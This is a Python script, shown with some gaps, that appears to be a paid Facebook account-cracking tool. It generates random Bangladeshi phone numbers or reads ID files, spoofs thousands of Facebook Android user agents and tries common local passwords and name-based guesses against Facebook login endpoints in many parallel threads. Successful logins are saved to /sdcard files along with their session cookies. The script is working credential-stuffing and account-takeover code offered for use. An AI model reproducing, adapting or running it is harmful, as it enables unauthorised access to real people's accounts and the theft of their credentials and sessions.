import random,os,sys,string,requests,time,json,base64,re
from concurrent.futures import ThreadPoolExecutor as mahdiTrd
try:
    import mahdix
except:os.system('pip install mahdix')
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/ZERO-69/approve.txt/blob/main/approve.txt').text
...
""")
  ...
  os.system('espeak -a 300 "paid, version, 0.1"')
  ...
  print(f"")
  print(f"\x1b[1;92m   15 DAY 500 30 DAY 800  *** 2 DAY FREE TRYAL                                                                ");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32     YOUR  KEY : "+UMO+id)
  print(f"")
  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print(f"")
  print(f"");time.sleep(2)
  os.system('espeak -a 300 "chaking, your, approval"')
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  os.system('espeak -a 300 "enter,  your name, fore chak, your approval key"')
  name = input(" Your Name : ")
  print ("")
  try:
    httpCaht = requests.get("https://github.com/ZERO-69/approve.txt/blob/main/approve.txt").text
    if id in httpCaht:
...
##    ## ##     ## ##     ## ##     ## 
 ######  ##     ## ##     ## ########
╭──\x1b[38;5;46m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\x1b[38;5;46m──╮
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m FACEBOOK  \033[38;5;196m:\x1b[38;5;46m SAAD KING　 ツ                 │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m GITHUB   \033[38;5;196m :\x1b[38;5;46m SAAD\033[38;5;196m-\x1b[38;5;46m404                       │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m TOOL      \033[38;5;196m:\x1b[38;5;46m RANDOM CLONE                   │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m VERSION   \033[38;5;196m:\x1b[38;5;46m 0.1                          │
╰──\x1b[38;5;46m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\033[38;5;196m──\x1b[38;5;46m──\x1b[38;5;46m──╯"""
...
W=mahdix.LI_WHITE
Bl=mahdix.LI_BLUE
Or=mahdix.LI_MAGENTA
def manu():
    mahdix.clear()
    print(logo)
    print(f'{W}[1]{Y} Ramdom Bd {Cy}  [V0.1]')
    print(f'{W}[2]{G} File Coning {Cy}[V0.1]')
    print(f'{W}[3] Contact With Admin')
    chu=input(f'{Cy}Input Chouse :{Y} ')
    if chu in ['1','01','A']:
        mahdix.clear()
        randombd()
    if chu in ['2','02','B']:
...
for xd in range(1000):
    ...
    ugenxe.append(uateddy)
   
ugenxe.extend(ugenxeugenxe)
for i in range(2000):
    fbs = random.choice([
    ...
    try:
        ugenxe.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
for agent in range(10000):
        ...
        ugenxe.append('Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(width_)+',height='+str(height_)+'};]')

def randombd():
    mahdix.clear()
    print(logo)
    print(f'{Y}[√] BD CODE : {G}[{R}017{Bl} 019 {Cy}016{W} 013{R} 018{G} 014 {Y}015{Cy}]')
    code = input('\033[1;32m[?] CHOOSE : ')
    print(mahdix.linex())
    print(f'\033[1;32m[√] EXAMPLE : {G}3000{Y}/{W}5000{Cy}/{W}10000{Bl}/{R}50000')
    print(mahdix.mahdilinx())
    limit = int(input(f'\033[1;32m[?] limite : {Y}'))
    print(mahdix.linex())
    print(f'{W}[1]{Or} Mathod {G}1')
    print(f'{W}[2]{Or} Mathod {G}2')
    mathod=input(f'{Y}CHOOSE : {W}')
    print(mahdix.mahdilinx())
    madhicp=input(f'\033[1;32m[?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if madhicp in ['y','Y','yes','Yes','1']:madhi_cp.append('y')
    else:madhi_cp.append('n')
    print(mahdix.linex())
    madhicoki=input(f'\033[1;32m[?] You Want To Show Cookies Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if madhicoki in ['y','Y','yes','Yes','1']:mahdi_coki.append('y')
    else:mahdi_coki.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        bdNu.append(nmp)
    with mahdiTrd(max_workers=80) as mprogect_500:
        mahdix.clear()
        print(logo)
        tl = str(len(bdNu))
        print(f'\033[1;32m {W}[+] {G}Choice Code: {W}'+code)
        print(f'\033[1;92m {W}[+] {G}TOtal Number ; {Y}{limit}')
        print(f'\033[1;92m {W}[+] {G}Crack Process Has Started')
        print(f'\033[1;92m {W}[!] {G}Use Flight Mode For Speed Up')
        print(mahdix.mahdilinx())
        for fuck in bdNu:
            pwx = [code+fuck[2:],code+fuck,code+fuck[:7],code+fuck[:6],code+fuck[:5],fuck,code+fuck[:3],code+fuck[4:],fuck[2:],'bangladesh','mehedi@123','i love you','@#@#@#','Bangladesh','free fire','987654321','iloveyou','sadiya','102030','708090','203040','taniya','mababa','jannat','bristy','alamin','sabbir','shakib','farjana','sultana','afsana',' afredi','jannati','shikha','shakila','nupur123','fatema','nabila','trisha','SAADi','meghla','farjana','konika','moniya','muskan','nusrat','taybul','shohan','furkan','kawsar','nilima','forida','anjoli','rupsha','shobuj','nil123','kobita','eva123', 'halima',' nilima','jesmin','kajoli','Alamin','Jannat','Alomgir','alomgir','takbir','Takbir','marufa','i love you','bangladesh','Bangladesh','humaiyon','hafizur','saiful','yeasin','sahinur','sabbir','mubarok','allahu','mahedi','shakib','salman','mim123','mariya','ripon123','jinnat','zinnat','sajahol','arafat','monika','kuddus','komola','mistar','farjilat','museda','sabana','sabnur','sohagi','nusrat','mursed','lamiya','hannan','khalek','billal','nishat','bithi123','kamrul','Kamrul']
            uid = code+fuck
            if '1' in mathod:
                mprogect_500.submit(bapi,uid,pwx,tl)
            if '2' in mathod:
                mprogect_500.submit(rcrack,uid,pwx,tl)
            else:
...
def file():
    ...
    print(logo)
    print(mahdix.mahdilinx())
    filex=input(f'{mahdix.LI_GREEN}Input OK Ids File :{mahdix.LI_YELLOW}')
    try:
        idsfile=open(filex,'r').read().splitlines()
    except:
        print(f'{mahdix.LI_RED}Fast Input File')
        print(mahdix.mahdilinx())
        time.sleep(3)
        file()
    print(mahdix.linex())
    print(f'{W}[1]{Or} Mathod {G}v1')
    print(f'{W}[2]{Or} Mathod {G}V2')
    #print(f'{W}[3]{Or} Mathod {G}V3')
    mathod=input(f'{Y}CHOOSE : {W}')
    print(mahdix.mahdilinx())
    madhicp=input(f'\033[1;32m[?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if madhicp in ['y','Y','yes','Yes','1']:madhi_cp.append('y')
    ...
    print(logo)
    mahdix.time()
    print(f'\033[1;36mTOTAL IDS  : {W}%s ' % len(idsfile))
    print(f"\r{Y}OF{W}/{G}ON {Y}FLIGHT (airplane){W} MODE \033[1;96m")
    print(mahdix.mahdilinx())
    with mahdiTrd(max_workers=50) as mahdisub:
        for s in idsfile: 
            try:
                pwx=[]
                uid=s.split('|')[0]
                ...
                fast_lo= fast.lower()
                last_lo= mahdi_last.lower()
                pwx.append(name)
                pwx.append(name+'@123')
                pwx.append(name+'@@')
                pwx.append(name+'123')
                pwx.append(fast_lo+'123')
                pwx.append(fast_lo+'@123')
                pwx.append(fast_lo+'1234')
                pwx.append(last_lo+'123')
                pwx.append(last_lo+'@123')
                pwx.append(last_lo+'@@')
                strings_to_append = ['FREEFIRE@#', 'free fire', 'Free Fire', 'freefire']
                pwx.extend(strings_to_append)
                if '1' in mathod:
                    mahdisub.submit(bapi,uid,pwx,tl)
                if '2' in mathod:
                    mahdisub.submit(rcrack,uid,pwx,tl)
                else:
                    mahdisub.submit(bapi,uid,pwx,tl)
                        #wx = [name,name+'123',fast_lo+'123',fast_up+'123',lofs+'123',lofs+'@123',fast_lo+'@123',fast_lo+'1234',last_lo+'123',last_ti+'123',last_up+'123',last_ti+'@123']
                    #pwx = ["786110",'@#@#@#','fflover','Fre Fire','freefire','l love you']
                # if '1' in mathod:
                #     mahdisub.submit(bapi,uid,pwx,tl)
                # if '2' in mathod:
                #     mahdisub.submit(mahdiold,uid,pwx,tl)
                # else:
    ...
    print('Ok Ids Saved in /MAHDI-CP.txt')
    print('Cp Ids Saved in /MAHDI-CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\r {random.choice(mahdix.mycolor)}[{random.choice(mahdix.mycolor)}={random.choice(mahdix.mycolor)}]~[{random.choice(mahdix.mycolor)}SAAD~M2{W}]~[{random.choice(mahdix.mycolor)}OK|CP{random.choice(mahdix.mycolor)}{random.choice(mahdix.mycolor)}]~[{len(cracked)}]~[{random.choice(mahdix.mycolor)}{tl}]~[{random.choice(mahdix.mycolor)}{G}{random.choice(mahdix.mycolor)}{len(oks)}{W}|{random.choice(mahdix.mycolor)}{R}{random.choice(mahdix.mycolor)}{len(cps)}{W}{random.choice(mahdix.mycolor)}] ');sys.stdout.flush()
            pro = random.choice(ugenxe)
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[SAAD-OK💚] \033[1;32m'+cid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/SAAD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
...
def bapi(uid,pwx,tl):
    ...
    try:
        sys.stdout.write(f'\r\r {random.choice(mahdix.mycolor)}[{random.choice(mahdix.mycolor)}={random.choice(mahdix.mycolor)}]~[{random.choice(mahdix.mycolor)}SAAD~M2{W}]~[{random.choice(mahdix.mycolor)}OK|CP{random.choice(mahdix.mycolor)}{random.choice(mahdix.mycolor)}]~[{len(cracked)}]~[{random.choice(mahdix.mycolor)}{tl}]~[{random.choice(mahdix.mycolor)}{G}{random.choice(mahdix.mycolor)}{len(oks)}{W}|{random.choice(mahdix.mycolor)}{R}{random.choice(mahdix.mycolor)}{len(cps)}{W}{random.choice(mahdix.mycolor)}] ');sys.stdout.flush()
        for pw in pwx:
            #proxys = gtproxy.splitlines();proxy = random.choice(proxys);proxs= {'http': 'socks4://'+proxy}
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
            ...
            headersX = {'accept-encoding': 'gzip, deflate', 
                    ...
                    'user-agent':random.choice(ugenxe)}# ua_api()}
            ...
            if 'session_key' in responce_json:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in responce_json["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"mahdi={ssbb};{ckkk}"
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'{Y}NUMBER :{G}{uidX}')
                    print(f'{G}PASS   : {W}{pw}')
                    open('/sdcard/SAAD-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    if 'y' in mahdi_coki:
                        print(f'{Bl}COOKIS :{mahdix.LI_GREEN}{cookie}')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    if 'y' in madhi_cp:
                        print(f'\r{R}[SAAD-CP] {uid}  | {pw} {W}')
                        open('/sdcard/SAAD-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
